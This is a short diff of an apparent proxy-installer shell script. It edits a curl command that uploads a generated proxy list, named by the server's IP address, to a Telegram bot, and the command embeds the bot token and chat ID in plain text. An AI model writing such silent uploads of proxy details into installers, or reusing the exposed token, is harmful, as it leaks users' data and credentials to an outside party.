@@ -81,7 +81,7 @@ upload_proxy() {
 
     cp proxy.txt "$IP4".txt
 
-    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-2109534015' https://api.telegram.org/bot7257969590:AAFr2u0XrbgJ1rsFPEBmqw_MOAHFKInzLzA/sendDocument
+    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=2109534015' https://api.telegram.org/bot7257969590:AAFr2u0XrbgJ1rsFPEBmqw_MOAHFKInzLzA/sendDocument
 
 }
 gen_data() {
